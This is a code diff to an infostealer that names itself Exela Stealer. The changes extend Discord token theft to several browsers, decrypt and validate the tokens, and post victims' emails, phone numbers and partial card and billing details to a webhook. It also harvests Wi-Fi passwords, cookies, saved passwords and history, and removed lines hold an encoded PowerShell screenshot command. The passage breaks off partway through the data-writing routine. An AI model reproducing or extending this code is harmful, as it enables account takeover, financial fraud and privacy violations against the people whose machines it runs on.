@@ -132,6 +132,8 @@ class QuicaxdExela:
         self.growtopia = False
         self.discrod = False
         self.dcToken = []
+        self.fullTokens = list()
+        self.validatedTokens = list()
         self.discordd = []
         self.instaa = []
         self.twitterr = []
@@ -140,13 +142,13 @@ class QuicaxdExela:
         self.steamm = []
         self.robloxx = []
         self.growtopiaa = []        
-        self.doitEveryProfile()
-        self.callMozilla()
-        self.setSteam()
-        self.setDiscord()
+        #self.doitEveryProfile()
+        #self.callMozilla()
+        #self.setSteam()
+        #self.setDiscord()
         self.writeAllData()
         self.sendxd()
-        self.callMePls()
+        #self.callMePls()
     def callMozilla(self):
         self.GetMozillaProfiles()
         self.get_cookies_firefox()
@@ -168,11 +170,12 @@ class QuicaxdExela:
         }
         for _,path in full_browsers.items():
             for f in profiles:
-                self.connect_to_database(path, f, "Local")
-                self.connect_to_database2(path, f, "Local") 
-                self.connect_to_database3(path, f, "Local")
-                self.connect_to_database4(path, f, "Local")
-                self.connect_to_database5(path, f, "Local")
+
+                 self.connect_to_database(path, f, "Local")
+                 self.connect_to_database2(path, f, "Local") 
+                 self.connect_to_database3(path, f, "Local")
+                 self.connect_to_database4(path, f, "Local")
+                 self.connect_to_database5(path, f, "Local")
 
     def connect_to_database(self, value, value2, asd):
         try:
@@ -227,7 +230,6 @@ class QuicaxdExela:
             if not os.path.isfile(path):
                 return
             else:
-                #print(path)
                 self.login_data_path = path
                 shutil.copy2(self.login_data_path, self.backup_login_data_path)
                 conn = sqlite3.connect(self.backup_login_data_path)
@@ -345,10 +347,6 @@ class QuicaxdExela:
             if not os.path.isfile(path):
                 return
             else:
-                try:
-                    ana_dizin, profil_kismi = profPath.replace('\\User Data', '').replace('\\', "_").rsplit('Local', 1)
-                except:
-                    ana_dizin, profil_kismi = profPath.replace('\\User Data', '').replace('\\', "_").rsplit('Roaming', 1)
                 self.login_data_path = path
                 shutil.copy2(self.login_data_path, self.backup_login_data_path)
                 conn = sqlite3.connect(self.backup_login_data_path)
@@ -651,27 +649,50 @@ class QuicaxdExela:
             paths = {
                 "Discord" : os.getenv("appdata") +  "\\" + os.path.join("discord", "Local Storage", "leveldb"),
                 "Discord Canary" : os.getenv("appdata") + "\\" + os.path.join("discordcanary", "Local Storage", "leveldb"),
-                "Discord PTB" : os.getenv("appdata") + "\\" + os.path.join("discordptb", "Local Storage", "leveldb")
-            }
+                "Discord PTB" : os.getenv("appdata") + "\\" + os.path.join("discordptb", "Local Storage", "leveldb"),
+                'Opera GX' : self.roaming_app_data + os.path.join("\Opera Software", "Opera GX Stable"),
+                'Opera' : self.roaming_app_data + os.path.join("\Opera Software", "Opera Stable"),
+                'Chrome' : self.local_app_data + os.path.join("\Google", "Chrome","User Data"),
+                'Brave' : self.local_app_data + os.path.join("\BraveSoftware", "Brave-Browser","User Data"),
+                'Edge' : self.local_app_data + os.path.join("\Microsoft", "Edge","User Data"),
+                'Vivaldi' : self.local_app_data + os.path.join("\Vivaldi","User Data"),}
             for name, path in paths.items():
-                if not os.path.isdir(path):
-                    continue
-                discord = name.replace(" ", "").lower()
-                if "discord" in path:
-                    if not os.path.isfile(os.getenv("appdata") + f"\\{discord}\\Local State"):
-                        continue
-                    for file_name in os.listdir(path):
-                        if file_name[-3:] not in ["log", "ldb"]:
-                            continue
-                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                            for q in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):
-                                if SubModules.Decrpytion(base64.b64decode(q.split('dQw4w9WgXcQ:')[1]), SubModules.GetKey(os.getenv("appdata") + f"\\Discord\\Local State")) in self.dcToken:
-                                    continue
-                                else:
-                                    self.validateDcTokenAndGetInfo(SubModules.Decrpytion(base64.b64decode(q.split('dQw4w9WgXcQ:')[1]), SubModules.GetKey(os.getenv("appdata") + f"\\Discord\\Local State")))
+                if "cord" in path: # extract tokens from discord's
+                    if os.path.exists(path):
+                        key = SubModules.GetKey(path.replace(r"Local Storage\leveldb", "Local State"))
+                        for y in os.listdir(path):
+                            full_path = os.path.join(path, y)
+                            if full_path[-3:] in ["log", "ldb"]:
+                                with open(full_path, "r", encoding="utf-8", errors="ignore") as files:
+                                    for tokens in re.findall(r"dQw4w9WgXcQ:[^\"]*", files.read()):
+                                        if tokens:
+                                            enc_token = base64.b64decode(tokens.split("dQw4w9WgXcQ:")[1])
+                                            dec_token = SubModules.Decrpytion(enc_token, key)
+                                            if not dec_token in self.fullTokens:
+                                                self.fullTokens.append(dec_token)
+                                                self.validateDcTokenAndGetInfo(dec_token, name)
+                                            else:
+                                                continue                                      
+                else: # extract tokens from browsers
+                    if os.path.exists(path):
+                        for root, folders, files in os.walk(path):
+                            for folder in folders:
+                                folder_path = os.path.join(root, folder)
+                                if r"Local Storage\leveldb" in folder_path:
+                                    for xd in os.listdir(folder_path):
+                                        if xd[-3:] in ["log", "ldb"]:
+                                            new_path = os.path.join(folder_path, xd)
+                                            with open(new_path, "r", encoding="utf-8", errors="ignore") as files:
+                                                 for tokens in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", files.read()):
+                                                    if tokens:
+                                                        if not tokens in self.fullTokens:
+                                                            self.fullTokens.append(tokens)
+                                                            self.validateDcTokenAndGetInfo(tokens, name)
+                                                        else:
+                                                            continue                               
         except Exception as e:
             print(str(e))
-    def validateDcTokenAndGetInfo(self, value):
+    def validateDcTokenAndGetInfo(self, value, browserorname):
         try:
             headers = {"Authorization" : value}
             url = "https://discord.com/api/v8/users/@me"
@@ -682,44 +703,44 @@ class QuicaxdExela:
                 return  
             else:
                 self.discrod = True
-                if not value in self.dcToken:
-                    self.dcToken.append(value)
-            for f in self.dcToken:
-                id = req.json()["id"]
-                dcpp = f"https://cdn.discordapp.com/avatars/{id}/{req.json()['avatar']}"
-                payment = req.json()['premium_type']
-                nitro = ""
-                if requests.get(dcpp + ".png").status_code == 200:
-                    dcpp += ".png"
-                else:dcpp += ".gif"
-                embed = dhooks.Embed(title="***Developer's github account***", description=f"***Exela Discord Token Detected***", color=0x070707, url="https://github.com/quicaxd", timestamp = "now")
-                embed.set_thumbnail(url=dcpp)
-                embed.add_field(name="<a:earthpink:996004236531859588> Discord Account ID",inline=True, value=f"```{id}```")
-                embed.add_field(name="<a:rainbowheart:996004226092245072> Discord Username",inline=True, value=f"```{req.json()['username']}```")
-                embed.add_field(name="<a:rainbowheart:996004226092245072> Discord Email",inline=True, value=f"```{req.json()['email']}```")
-                if req.json()["phone"] != None:
-                    embed.add_field(name="<:starxglow:996004217699434496> Phone",inline=True, value=f"```{req.json()['phone']}```")
-                embed.add_field(name="<:mfa:1021604916537602088> IS MFA Enabled",inline=True, value=f"```{req.json()['mfa_enabled']}```")
-                if payment == 0:nitro="No Nitro"
-                elif payment == 1:nitro="Nitro Classic"
-                elif payment == 2:nitro="Normal Classic"
-                elif payment == 3:nitro="Nitro Basic"
-                else:nitro="Unkown"
-                embed.add_field(name="<a:pinklv:996004222090891366> Nitro Billing", value=f"```{nitro}```")
-                if "billing_address" in req2.text:
-                    dataa = req2.json()[0]
-                    billgininfo = f"{dataa['billing_address']['line_1']}, {dataa['billing_address']['city']}, " + f"{dataa['billing_address']['country']}, " + f"{dataa['billing_address']['postal_code']}, "
-                    embed.add_field(name="💳 Paymen information", inline=False, value = f"```card Type : {dataa['brand']}, Last Four : {dataa['last_4']}, Expiration Date : {dataa['expires_month']}/{dataa['expires_year']}, Cart on name : {dataa['billing_address']['name']}, Adress : {billgininfo}```")
-                else:
-                    pass
-                if req.json()['bio'] != "":
-                    embed.add_field(name="<a:gift:1021608479808569435> Discord Account Biography",inline=False, value=f"```{req.json()['bio']}```")
-                embed.add_field(name=f"<a:pinkcrown:996004209667346442> Discord Token",inline=False, value=f"```{f}```")
-                embed.set_footer(text="https://t.me/ExelaStealer")
-                self.hook.send(embed=embed)
-                self.discordd.append(f"Discord ID : {id}\nUsername : {req.json()['username']}\nEmail : {req.json()['email']}\nis mfa Enabled : {req.json()['mfa_enabled']}\nNitro Status : {nitro}\nDiscord Token : {str(f)}")
-        except:
-            pass
+                self.validatedTokens.append(value)
+                print("validtes")
+                for f in self.validatedTokens:
+                    id = req.json()["id"]
+                    dcpp = f"https://cdn.discordapp.com/avatars/{id}/{req.json()['avatar']}"
+                    payment = req.json()['premium_type']
+                    nitro = ""
+                    if requests.get(dcpp + ".png").status_code == 200:
+                        dcpp += ".png"
+                    else:dcpp += ".gif"
+                    embed = dhooks.Embed(title="***Developer's github account***", description=f"***Exela Discord Token Detected on {browserorname}***", color=0x070707, url="https://github.com/quicaxd", timestamp = "now")
+                    embed.set_thumbnail(url=dcpp)
+                    embed.add_field(name="<a:earthpink:996004236531859588> Discord Account ID",inline=True, value=f"```{id}```")
+                    embed.add_field(name="<a:rainbowheart:996004226092245072> Discord Username",inline=True, value=f"```{req.json()['username']}```")
+                    embed.add_field(name="<a:rainbowheart:996004226092245072> Discord Email",inline=True, value=f"```{req.json()['email']}```")
+                    if req.json()["phone"] != None:
+                        embed.add_field(name="<:starxglow:996004217699434496> Phone",inline=True, value=f"```{req.json()['phone']}```")
+                    embed.add_field(name="<:mfa:1021604916537602088> IS MFA Enabled",inline=True, value=f"```{req.json()['mfa_enabled']}```")
+                    if payment == 0:nitro="No Nitro"
+                    elif payment == 1:nitro="Nitro Classic"
+                    elif payment == 2:nitro="Normal Classic"
+                    elif payment == 3:nitro="Nitro Basic"
+                    else:nitro="Unkown"
+                    embed.add_field(name="<a:pinklv:996004222090891366> Nitro Billing", value=f"```{nitro}```")
+                    if "billing_address" in req2.text:
+                        dataa = req2.json()[0]
+                        billgininfo = f"{dataa['billing_address']['line_1']}, {dataa['billing_address']['city']}, " + f"{dataa['billing_address']['country']}, " + f"{dataa['billing_address']['postal_code']}, "
+                        embed.add_field(name="💳 Paymen information", inline=False, value = f"```card Type : {dataa['brand']}, Last Four : {dataa['last_4']}, Expiration Date : {dataa['expires_month']}/{dataa['expires_year']}, Cart on name : {dataa['billing_address']['name']}, Adress : {billgininfo}```")
+                    else:
+                        pass
+                    if req.json()['bio'] != "":
+                        embed.add_field(name="<a:gift:1021608479808569435> Discord Account Biography",inline=False, value=f"```{req.json()['bio']}```")
+                    embed.add_field(name=f"<a:pinkcrown:996004209667346442> Discord Token",inline=False, value=f"```{f}```")
+                    embed.set_footer(text="https://t.me/ExelaStealer")
+                    self.hook.send(embed=embed)
+                    self.discordd.append(f"Discord ID : {id}\nUsername : {req.json()['username']}\nEmail : {req.json()['email']}\nis mfa Enabled : {req.json()['mfa_enabled']}\nNitro Status : {nitro}\nDiscord Token : {str(f)}")
+        except Exception as e:
+            print(e)
     def metlFile(self):
         pathxd = os.getenv("localappdata") + r"\WindowsUpdateChecker"
         fullPath = os.path.abspath(sys.argv[0])
@@ -939,52 +960,23 @@ class QuicaxdExela:
     def GetWifiPasswords(self, path:str):
         pathxd = os.path.join(path, "Wifi.txt")
         try:
-            command = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output = True, shell=True).stdout.decode(errors="ignore")
-            wifi_files = []
-            for filename in os.listdir(os.getcwd()):
-                if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
-                    wifi_files.append(filename)
-            for i in wifi_files:
-                with open(i, 'r') as f:
-                    name_counter = 0
-                    wifi_name = ""
-                    wifi_password = ""
-                    creds = []
-                    for line in f.readlines():
-                        if "name" in line and name_counter == 0:
-                            name_counter += 1
-                            stripped = line.strip()
-                            front = stripped[6:]
-                            back = front[:-7]
-                            wifi_name = back
-                        if "keyMaterial" in line:
-                            stripped = line.strip()
-                            front = stripped[13:]
-                            back = front[:-14]
-                            wifi_password = back
-                if wifi_password == "":
-                    wifi_password = "none"
-                creds = [wifi_name, wifi_password]
-                with open(pathxd, 'a', encoding="utf-8", errors="ignore") as f:
-                    f.write("\n[*] Wifi Name: " + creds[0] + "\n" + "[+] Wifi Password: " + creds[1] + "\n")
-                    f.close()
-                # Delete created files
-            for y in wifi_files:
-                os.remove(y)
-            wifi_profiles = []
-            wifi_passwords = dict()
-            command = subprocess.run('netsh wlan show profile', shell= True, capture_output= True).stdout.decode(errors= 'ignore').strip().splitlines()
-            for line in command:
-                if 'All User Profile' in line:
-                    name= line[(line.find(':') + 1):].strip()
-                    wifi_profiles.append(name)
-                for profile in wifi_profiles:
-                    for line in subprocess.run(f'netsh wlan show profile "{profile}" key=clear', shell= True, capture_output= True).stdout.decode(errors= 'ignore').strip().splitlines():
-                        if 'Key Content' in line:
-                            wifi_passwords[profile] = line[(line.find(':') + 1):].strip()    
-            with open(pathxd, "a", errors="ignore", encoding="utf-8") as data:
-                for profile, password in wifi_passwords.items():
-                    data.write(f"WiFi Profile: {profile}\nPassword: {password}\n\n")
+            wifi_list = list()
+            current_code_page = subprocess.check_output("chcp", shell=True).decode().split(":")[1].strip()
+            result = subprocess.check_output("netsh wlan show profiles", shell=True)
+            try:
+                result = result.decode(current_code_page)
+            except:result = result.decode(errors="ignore")
+            wifi_profile_names = re.findall(r'All User Profile\s*: (.*)', result)
+            for profile_name in wifi_profile_names:
+                result = subprocess.check_output(f'netsh wlan show profile name="{profile_name}" key=clear', shell=True, encoding=None)
+                try:
+                    password_match = re.search(r'Key content\s*: (.*)', result.decode(current_code_page), re.IGNORECASE)
+                except:password_match = re.search(r'Key content\s*: (.*)', result.decode(errors="ignore"), re.IGNORECASE)
+                wifi_list.append((profile_name, password_match.group(1) if password_match else "No password found"))
+            with open(pathxd,"a", encoding="utf-8", errors="ignore") as file:
+                file.write("https://t.me/ExelaStealer\n===========================================")
+                for name, passw in wifi_list:
+                    file.write(f"\nWifi Profile : {name}\nWifi Password : {passw}\n===========================================")
         except Exception as asd:
             print(str(asd))
     def writeAllData(self):    
@@ -993,264 +985,149 @@ class QuicaxdExela:
         tmp = os.getenv('temp')
         mic_finder = GetMic()
         mic_data = mic_finder.list_microphones()
-        if os.path.isdir(tmp + f"\\{run}"):
-            shutil.rmtree(tmp+f'\\{run}')
-            print("Deleted Temp Folder!, creating new folder") 
+        if not os.path.isdir(tmp + f"\\{run}"):
             os.mkdir(tmp + f"\\{run}")
-            if not self.passws == 0:
-                os.mkdir(tmp + f"\\{run}\\Passwords")
-                with open(tmp + f"\\{run}\\Passwords\\Passwords.txt", "a", encoding="utf-8", errors="ingore") as f:
-                    f.write("----------------------https://t.me/ExelaStealer----------------------\n" + "=" * 70 + "\n")
-                    for passwss in self.passw:
-                        f.write(str(passwss) + "\n")
-            if not self.cc == 0:
-                os.mkdir(tmp + f"\\{run}\\Cards")
-                with open(tmp + f"\\{run}\\Cards\\Cards.txt", "a", encoding="utf-8", errors="ingore") as x:
-                    x.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for uknowwhatiscc in self.ottomonCC:
-                        x.write(str(uknowwhatiscc) + "\n")
-            if not self.cookie == 0:
-                os.mkdir(tmp + f"\\{run}\\Cookies")
-                with open(tmp + f"\\{run}\\Cookies\\Cookies.txt", "a", encoding="utf-8", errors="ingore") as c:
-                    c.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for allCookies in self.cookeds:
-                        c.write(str(allCookies) + "\n")
-            if not self.downloads == 0:
-                os.mkdir(tmp + f"\\{run}\\Downloads")
-                with open(tmp + f"\\{run}\\Downloads\\Downloads.txt", "a", encoding="utf-8", errors="ingore") as d:
-                    d.write("----------------------https://t.me/ExelaStealer----------------------\n" + "=" * 70 + "\n")
-                    for dwnlds in self.sexDonwloads:
-                        d.write(str(dwnlds) + "\n")
-            if not self.historys == 0:
-                os.mkdir(tmp + f"\\{run}\\Historys")
-                with open(tmp + f"\\{run}\\Historys\\Historys.txt", "a", encoding="utf-8", errors="ingore") as q:
-                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for date in self.sexHistorys:
-                        q.write(str(date) + "\n")
-            if self.mozilla_history:
-                try:
-                    os.mkdir(tmp + f"\\{run}\\Firefox")
-                except:
-                    pass
-                with open(tmp + f"\\{run}\\Firefox\\History.txt", "a", encoding="utf-8", errors="ingore") as q:
-                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for date in self.mozilla_history:
-                        q.write(str(date) + "\n")
-            if self.mozilla_cookie:
-                try:
-                    os.mkdir(tmp + f"\\{run}\\Firefox")
-                except:
-                    pass
-                with open(tmp + f"\\{run}\\Firefox\\Cookies.txt", "a", encoding="utf-8", errors="ingore") as q:
-                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for date in self.mozilla_cookie:
-                        q.write(str(date) + "\n")
-            if not self.insta == 0:
-                os.mkdir(tmp + f"\\{run}\\Instagram")
-                with open(tmp + f"\\{run}\\Instagram\\instagram.txt", "a", encoding="utf-8", errors="ingore") as q:
-                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for ii in self.instaa:
-                        q.write(str(ii) + "\n")
-            if not self.twitter == 0:
-                os.mkdir(tmp + f"\\{run}\\Twitter")
-                with open(tmp + f"\\{run}\\Twitter\\Twitter.txt", "a", encoding="utf-8", errors="ingore") as q:
-                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for tt in self.twitterr:
-                        q.write(str(tt) + "\n")
-            if not self.tiktok == 0:
-                os.mkdir(tmp + f"\\{run}\\Tiktok")
-                with open(tmp + f"\\{run}\\Tiktok\\Tiktok.txt", "a", encoding="utf-8", errors="ingore") as q:
-                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for ti in self.tiktokk:
-                        q.write(str(ti) + "\n")
-            if not self.reddit == 0:
-                os.mkdir(tmp + f"\\{run}\\Reddit")
-                with open(tmp + f"\\{run}\\Reddit\\Reddit.txt", "a", encoding="utf-8", errors="ingore") as q:
-                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for re in self.redditt:
-                        q.write(str(re) + "\n")
-            if self.discrod:
-                os.mkdir(tmp + f"\\{run}\\Discord")
-                with open(tmp + f"\\{run}\\Discord\\Discord.txt", "a", encoding="utf-8", errors="ingore") as q:
-                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for re in self.discordd:
-                        q.write(str(re) + "\n")
-            if not self.steam:
-                os.mkdir(tmp + f"\\{run}\\Steam")
-                with open(tmp + f"\\{run}\\Steam\\Steam.txt", "a", encoding="utf-8", errors="ingore") as q:
-                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for st in self.steamm:
-                        q.write(str(st) + "\n")
-            if self.roblox==True:
-                os.mkdir(tmp + f"\\{run}\\Roblox")
-                with open(tmp + f"\\{run}\\Roblox\\Roblox.txt", "a", encoding="utf-8", errors="ignore") as q:
-                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for robl in self.robloxx:
-                        q.write(str(robl))
-            if not self.growtopia == 0:
-                os.mkdir(tmp + f"\\{run}\\Growtopia")
-                with open(tmp + f"\\{run}\\Growtopia\\Growtopia.txt", "a", encoding="utf-8", errors="ingore") as q:
-                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for gw in self.growtopiaa:
-                        q.write(str(gw) + "\n")
-            if 5 < 10:
-                command = "JABzAG8AdQByAGMAZQAgAD0AIABAACIADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtADsADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AQwBvAGwAbABlAGMAdABpAG8AbgBzAC4ARwBlAG4AZQByAGkAYwA7AA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzADsADQAKAA0ACgBwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAFMAYwByAGUAZQBuAHMAaABvAHQADQAKAHsADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAEwAaQBzAHQAPABCAGkAdABtAGEAcAA+ACAAQwBhAHAAdAB1AHIAZQBTAGMAcgBlAGUAbgBzACgAKQANAAoAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAdgBhAHIAIAByAGUAcwB1AGwAdABzACAAPQAgAG4AZQB3ACAATABpAHMAdAA8AEIAaQB0AG0AYQBwAD4AKAApADsADQAKACAAIAAgACAAIAAgACAAIAB2AGEAcgAgAGEAbABsAFMAYwByAGUAZQBuAHMAIAA9ACAAUwBjAHIAZQBlAG4ALgBBAGwAbABTAGMAcgBlAGUAbgBzADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAZgBvAHIAZQBhAGMAaAAgACgAUwBjAHIAZQBlAG4AIABzAGMAcgBlAGUAbgAgAGkAbgAgAGEAbABsAFMAYwByAGUAZQBuAHMAKQANAAoAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAcgB5AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIAZQBjAHQAYQBuAGcAbABlACAAYgBvAHUAbgBkAHMAIAA9ACAAcwBjAHIAZQBlAG4ALgBCAG8AdQBuAGQAcwA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHUAcwBpAG4AZwAgACgAQgBpAHQAbQBhAHAAIABiAGkAdABtAGEAcAAgAD0AIABuAGUAdwAgAEIAaQB0AG0AYQBwACgAYgBvAHUAbgBkAHMALgBXAGkAZAB0AGgALAAgAGIAbwB1AG4AZABzAC4ASABlAGkAZwBoAHQAKQApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB1AHMAaQBuAGcAIAAoAEcAcgBhAHAAaABpAGMAcwAgAGcAcgBhAHAAaABpAGMAcwAgAD0AIABHAHIAYQBwAGgAaQBjAHMALgBGAHIAbwBtAEkAbQBhAGcAZQAoAGIAaQB0AG0AYQBwACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGcAcgBhAHAAaABpAGMAcwAuAEMAbwBwAHkARgByAG8AbQBTAGMAcgBlAGUAbgAoAG4AZQB3ACAAUABvAGkAbgB0ACgAYgBvAHUAbgBkAHMALgBMAGUAZgB0ACwAIABiAG8AdQBuAGQAcwAuAFQAbwBwACkALAAgAFAAbwBpAG4AdAAuAEUAbQBwAHQAeQAsACAAYgBvAHUAbgBkAHMALgBTAGkAegBlACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcgBlAHMAdQBsAHQAcwAuAEEAZABkACgAKABCAGkAdABtAGEAcAApAGIAaQB0AG0AYQBwAC4AQwBsAG8AbgBlACgAKQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoACAAKABFAHgAYwBlAHAAdABpAG8AbgApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC8ALwAgAEgAYQBuAGQAbABlACAAYQBuAHkAIABlAHgAYwBlAHAAdABpAG8AbgBzACAAaABlAHIAZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAcgBlAHQAdQByAG4AIAByAGUAcwB1AGwAdABzADsADQAKACAAIAAgACAAfQANAAoAfQANAAoAIgBAAA0ACgANAAoAQQBkAGQALQBUAHkAcABlACAALQBUAHkAcABlAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAHMAbwB1AHIAYwBlACAALQBSAGUAZgBlAHIAZQBuAGMAZQBkAEEAcwBzAGUAbQBiAGwAaQBlAHMAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALAAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwANAAoADQAKACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzACAAPQAgAFsAUwBjAHIAZQBlAG4AcwBoAG8AdABdADoAOgBDAGEAcAB0AHUAcgBlAFMAYwByAGUAZQBuAHMAKAApAA0ACgANAAoADQAKAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQAcwAuAEMAbwB1AG4AdAA7ACAAJABpACsAKwApAHsADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0ACAAPQAgACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzAFsAJABpAF0ADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0AC4AUwBhAHYAZQAoACIALgAvAEQAaQBzAHAAbABhAHkAIAAoACQAKAAkAGkAKwAxACkAKQAuAHAAbgBnACIAKQANAAoAIAAgACAAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQALgBEAGkAcwBwAG8AcwBlACgAKQANAAoAfQA=" # Unicode encoded command
-                subprocess.run(["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-EncodedCommand", command], shell=True, capture_output=True, cwd= tmp + f"\\{run}")
-            if 0 < 1:
-                active_window_title = self.get_active_window_title()
-                with open(tmp + f"\\{run}\\active_window.txt", "a", encoding="utf-8", errors="ignore") as x:
-                    x.write(str(active_window_title))
-            if 7<15:
-                try:
-                    process = subprocess.run("tasklist /FO LIST", capture_output= True, shell= True)
-                    output = process.stdout.decode(errors= "ignore").strip().replace("\r\n", "\n")
-                    with open(tmp + f"\\{run}\\process_list.txt", "w",encoding="utf-8", errors="ignore") as process_list:
-                        process_list.write(output)
-                except:
-                    pass
-            if 5 > 4:
-                self.get_last_clipboard_text(run)
-                self.get_last_clipboard_image(run)        
-            if 45 > 3:
+        shutil.rmtree(tmp+f'\\{run}')
+        print("Deleted Temp Folder!, creating new folder") 
+        os.mkdir(tmp + f"\\{run}")
+        if not self.passws == 0:
+            os.mkdir(tmp + f"\\{run}\\Passwords")
+            with open(tmp + f"\\{run}\\Passwords\\Passwords.txt", "a", encoding="utf-8", errors="ingore") as f:
+                f.write("----------------------https://t.me/ExelaStealer----------------------\n" + "=" * 70 + "\n")
+                for passwss in self.passw:
+                    f.write(str(passwss) + "\n")
+        if not self.cc == 0:
+            os.mkdir(tmp + f"\\{run}\\Cards")
+            with open(tmp + f"\\{run}\\Cards\\Cards.txt", "a", encoding="utf-8", errors="ingore") as x:
+                x.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                for uknowwhatiscc in self.ottomonCC:
+                    x.write(str(uknowwhatiscc) + "\n")
+        if not self.cookie == 0:
+            os.mkdir(tmp + f"\\{run}\\Cookies")
+            with open(tmp + f"\\{run}\\Cookies\\Cookies.txt", "a", encoding="utf-8", errors="ingore") as c:
+                c.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                for allCookies in self.cookeds:
+                    c.write(str(allCookies) + "\n")
+        if not self.downloads == 0:
+            os.mkdir(tmp + f"\\{run}\\Downloads")
+            with open(tmp + f"\\{run}\\Downloads\\Downloads.txt", "a", encoding="utf-8", errors="ingore") as d:
+                d.write("----------------------https://t.me/ExelaStealer----------------------\n" + "=" * 70 + "\n")
+                for dwnlds in self.sexDonwloads:
+                    d.write(str(dwnlds) + "\n")
+        if not self.historys == 0:
+            os.mkdir(tmp + f"\\{run}\\Historys")
+            with open(tmp + f"\\{run}\\Historys\\Historys.txt", "a", encoding="utf-8", errors="ingore") as q:
+                q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                for date in self.sexHistorys:
+                    q.write(str(date) + "\n")
+        if self.mozilla_history:
+            try:
+                os.mkdir(tmp + f"\\{run}\\Firefox")
+            except:
+                pass
+            with open(tmp + f"\\{run}\\Firefox\\History.txt", "a", encoding="utf-8", errors="ingore") as q:
+                q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                for date in self.mozilla_history:
+                    q.write(str(date) + "\n")
+        if self.mozilla_cookie:
+            try:
+                os.mkdir(tmp + f"\\{run}\\Firefox")
+            except:
+                pass
+            with open(tmp + f"\\{run}\\Firefox\\Cookies.txt", "a", encoding="utf-8", errors="ingore") as q:
+                q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                for date in self.mozilla_cookie:
+                    q.write(str(date) + "\n")
+        if not self.insta == 0:
+            os.mkdir(tmp + f"\\{run}\\Instagram")
+            with open(tmp + f"\\{run}\\Instagram\\instagram.txt", "a", encoding="utf-8", errors="ingore") as q:
+                q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                for ii in self.instaa:
